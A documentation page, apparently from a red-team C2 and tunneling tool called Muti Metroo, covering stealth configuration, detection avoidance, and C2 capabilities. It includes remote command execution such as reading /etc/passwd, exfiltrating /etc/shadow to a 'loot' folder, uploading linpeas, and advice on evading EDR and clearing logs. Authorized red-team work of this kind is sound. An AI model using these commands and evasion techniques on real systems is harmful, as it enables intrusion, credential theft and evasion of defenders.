---
title: Red Team Operations
sidebar_position: 7
---

# Red Team Operations Guide

This guide covers operational security (OPSEC) considerations for using Muti Metroo in authorized red team engagements, penetration testing, and security assessments.

:::warning Authorization Required
This documentation is intended for authorized security professionals conducting legitimate penetration tests, red team exercises, or security research. Always ensure you have proper written authorization before deploying Muti Metroo in any environment.
:::

## OPSEC Configuration

Muti Metroo includes several configurable options to reduce detection surface during operations.

### Protocol Identifier Customization

By default, Muti Metroo uses identifiable protocol strings that can be detected by network security tools. These can be customized or disabled entirely.

```yaml
protocol:
  # ALPN for QUIC/TLS connections (default: "muti-metroo/1")
  # Set to empty string "" to disable custom ALPN
  alpn: ""

  # HTTP header for H2 transport (default: "X-Muti-Metroo-Protocol")
  # Set to empty string "" to disable
  http_header: ""

  # WebSocket subprotocol (default: "muti-metroo/1")
  # Set to empty string "" to disable
  ws_subprotocol: ""
```

**Stealth mode example:**

```yaml
protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""
```

With all identifiers disabled:
- QUIC/TLS connections use standard TLS 1.3 without custom ALPN
- HTTP/2 connections have no distinguishing headers
- WebSocket connections use no custom subprotocol

### HTTP Endpoint Hardening

The HTTP API server exposes various endpoints that may leak operational information. Use granular controls to minimize exposure.

```yaml
http:
  enabled: true
  address: "127.0.0.1:8080"  # Bind to localhost only

  # Minimal mode - only health endpoints (/health, /healthz, /ready)
  minimal: true
```

Or with granular control:

```yaml
http:
  enabled: true
  address: "127.0.0.1:8080"

  # Disable information-leaking endpoints
  metrics: false     # Prometheus metrics expose internals
  pprof: false       # Go profiling - never in production
  dashboard: false   # Web UI shows topology
  remote_api: false  # Remote agent APIs
```

Disabled endpoints return HTTP 404 (indistinguishable from non-existent paths) while logging access attempts at debug level for awareness.

### Recommended Operational Configurations

#### Minimal Footprint (Relay/Transit)

For transit nodes that only relay traffic:

```yaml
protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true

socks5:
  enabled: false

exit:
  enabled: false

rpc:
  enabled: false

file_transfer:
  enabled: false
```

#### Ingress Node

For SOCKS5 ingress points:

```yaml
protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

socks5:
  enabled: true
  address: "127.0.0.1:1080"
  auth:
    enabled: true
    users:
      - username: "operator"
        password_hash: "$2a$10$..."  # Use bcrypt hash

http:
  enabled: true
  address: "127.0.0.1:8080"
  minimal: true
```

#### Exit Node

For exit points with specific route advertisements:

```yaml
protocol:
  alpn: ""
  http_header: ""
  ws_subprotocol: ""

exit:
  enabled: true
  routes:
    - "10.0.0.0/8"  # Only advertise target network

http:
  enabled: true
  address: "127.0.0.1:8080"
  metrics: true      # Keep for operational awareness
  pprof: false
  dashboard: false
  remote_api: false
```

## Transport Selection

Choose transports based on the target environment:

| Transport | Best For | Detection Considerations |
|-----------|----------|-------------------------|
| **QUIC** | High performance, NAT traversal | UDP-based, may trigger alerts on non-standard ports |
| **HTTP/2** | Corporate environments | Blends with HTTPS traffic on port 443 |
| **WebSocket** | Maximum compatibility | Works through HTTP proxies, CDNs |

### WebSocket Through Corporate Proxies

WebSocket is often the best choice for egress through corporate environments:

```yaml
peers:
  - id: "external-relay-id"
    transport: ws
    address: "wss://legitimate-looking-domain.com:443/api/stream"
    proxy: "http://corporate-proxy.internal:8080"
    proxy_auth:
      username: "${PROXY_USER}"
      password: "${PROXY_PASS}"
```

### HTTP/2 on Standard Ports

HTTP/2 on port 443 blends with normal HTTPS traffic:

```yaml
listeners:
  - transport: h2
    address: "0.0.0.0:443"
    path: "/api/v1/stream"  # Use realistic-looking path
```

## Operational Considerations

### Logging

Configure minimal logging to reduce disk artifacts:

```yaml
agent:
  log_level: "error"  # Only log errors
  log_format: "json"  # Easier to parse/filter
```

### Certificate Management

Use certificates that don't stand out:

1. **Generate realistic certificate names:**
   ```bash
   muti-metroo cert ca -n "Internal Services CA"
   muti-metroo cert agent -n "api-gateway-01"
   ```

2. **Match organizational naming conventions** when possible

3. **Use appropriate validity periods** - very long or very short validity may appear suspicious

### File and Directory Locations

Consider operational placement:

```yaml
agent:
  data_dir: "/var/lib/app-service/data"  # Blend with system services
```

Avoid obvious paths like `/tmp/c2/` or `/home/user/metroo/`.

### Process and Binary Considerations

- Rename the binary to match the environment
- Use system service installation for persistence and legitimacy
- Consider memory-only operation where possible

### Network Behavior

- **Beaconing patterns**: Default keepalive is 30s - consider adjusting for target environment norms
- **Connection timing**: Stagger peer connections to avoid burst patterns
- **Traffic volume**: Match expected traffic patterns for the cover story

## C2 Capabilities

Muti Metroo provides several command and control capabilities:

### Remote Command Execution (RPC)

```yaml
rpc:
  enabled: true
  whitelist:
    - "*"  # Allow all commands (use specific list in production)
  password_hash: "$2a$10$..."
  timeout: 60s
```

Execute commands remotely:
```bash
muti-metroo rpc <target-agent-id> whoami
muti-metroo rpc <target-agent-id> cat /etc/passwd
echo "script" | muti-metroo rpc <target-agent-id> bash
```

### File Exfiltration

```yaml
file_transfer:
  enabled: true
  password_hash: "$2a$10$..."
  allowed_paths:
    - "/"  # Full filesystem access
```

Transfer files:
```bash
# Download from target
muti-metroo download <target-id> /etc/shadow ./loot/shadow

# Upload tools
muti-metroo upload <target-id> ./tools/linpeas.sh /tmp/lp.sh
```

### Multi-Hop Routing

Traffic can be routed through multiple nodes for attribution resistance:

```
Operator -> Ingress -> Transit1 -> Transit2 -> Exit -> Target
```

Each hop only sees adjacent peers, not the full path.

## Management Key Encryption

Management key encryption provides cryptographic compartmentalization of mesh topology data. When enabled, sensitive metadata (NodeInfo, route paths) is encrypted with a management public key. Only operators with the corresponding private key can decrypt and view topology details. Compromised field agents see only opaque encrypted blobs.

### Threat Model

**Protected against:**
- Blue team captures agent, enables dashboard -> sees encrypted data only
- Blue team dumps agent memory -> no private key present
- Blue team analyzes network traffic -> NodeInfo/paths encrypted

**Not protected against:**
- Traffic analysis (connection patterns still visible)
- Agent ID correlation (IDs remain plaintext for routing)
- Compromise of operator machine with private key

### Generating Management Keys

Use the CLI to generate a new management keypair:

```bash
muti-metroo management-key generate
```

Output:
```
Management Public Key: a1b2c3d4e5f6789...  (64 hex chars)
Management Private Key: e5f6a7b8c9d0...    (64 hex chars)

Add to ALL agent configs:
  management:
    public_key: "a1b2c3d4e5f6789..."

Add to OPERATOR config only:
  management:
    private_key: "e5f6a7b8c9d0..."
```

### Configuration

**All field agents (encrypt only):**

```yaml
management:
  public_key: "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
```

**Operator nodes (can decrypt):**

```yaml
management:
  public_key: "a1b2c3d4e5f6789012345678901234567890123456789012345678901234abcd"
  private_key: "e5f6a7b8c9d012345678901234567890123456789012345678901234567890ef"
```

### What Gets Protected

| Data | Encrypted | Plaintext | Reason |
|------|-----------|-----------|--------|
| NodeInfo (hostname, OS, IPs) | Yes | | System identification |
| NodeInfo (peers, public key) | Yes | | Topology exposure |
| Agent IDs | | Yes | Required for routing |
| Route Paths | | Yes | Required for multi-hop routing |
| Route CIDRs/Metrics | | Yes | Required for routing |
| SeenBy lists | | Yes | Required for loop prevention |

**Note on Route Paths**: Route paths are kept in plaintext on the wire because transit agents need them to forward streams correctly. However, without the management private key, agents cannot decrypt the NodeInfo which contains the meaningful system identification (hostnames, OS details, IP addresses). Path entries only show opaque 128-bit agent IDs.

### API Behavior

When the dashboard or topology API is accessed on a node without the private key, the API returns limited information:
- Local agent info is visible (the agent knows its own identity)
- Remote agent display names come from decrypted NodeInfo - without the key, only short IDs are shown
- Route paths show agent IDs but not human-readable names

Operators with the private key see full topology details with all display names resolved.

### Key Distribution

**CRITICAL: Never distribute the private key to field agents.**

Recommended workflow:
1. Generate keypair on secure operator machine
2. Distribute **public key only** to all agents via config
3. Keep private key on operator nodes that need topology visibility
4. Store private key backup securely offline

### Setup Wizard

The setup wizard (`muti-metroo init`) includes a management key step:
- Skip (not recommended for red team ops)
- Generate new keypair (prints both keys, asks if operator node)
- Enter existing public key (for deploying to mesh)

## Detection Avoidance

### What Defenders Look For

| Indicator | Mitigation |
|-----------|------------|
| Custom ALPN strings | Set `protocol.alpn: ""` |
| X-Muti-Metroo-Protocol header | Set `protocol.http_header: ""` |
| WebSocket subprotocol | Set `protocol.ws_subprotocol: ""` |
| Unusual certificate CNs | Use realistic naming |
| /metrics, /debug endpoints | Set `http.minimal: true` |
| Consistent beaconing intervals | Adjust keepalive timing |
| Binary strings | Rename binary, strip if needed |

### Endpoint Security Considerations

When deployed on endpoints with EDR/AV:
- The binary is a standard Go executable
- No shellcode or code injection
- Network connections are standard TLS/QUIC/WebSocket
- Consider code signing if available

## Cleanup

After operations, ensure proper cleanup:

1. **Stop and remove service:**
   ```bash
   muti-metroo service uninstall
   ```

2. **Remove data directory:**
   ```bash
   rm -rf /path/to/data_dir
   ```

3. **Remove binary and configs:**
   ```bash
   rm /path/to/muti-metroo
   rm /path/to/config.yaml
   ```

4. **Clear logs:**
   - Remove any application logs
   - Consider system log entries

## Legal and Ethical Considerations

- Always obtain written authorization before deployment
- Document all activities for the engagement report
- Respect scope boundaries
- Report any unexpected findings through proper channels
- Coordinate with blue team if required by rules of engagement

---

For technical security details, see:
- [End-to-End Encryption](e2e-encryption)
- [TLS and mTLS](tls-mtls)
- [Authentication](authentication)
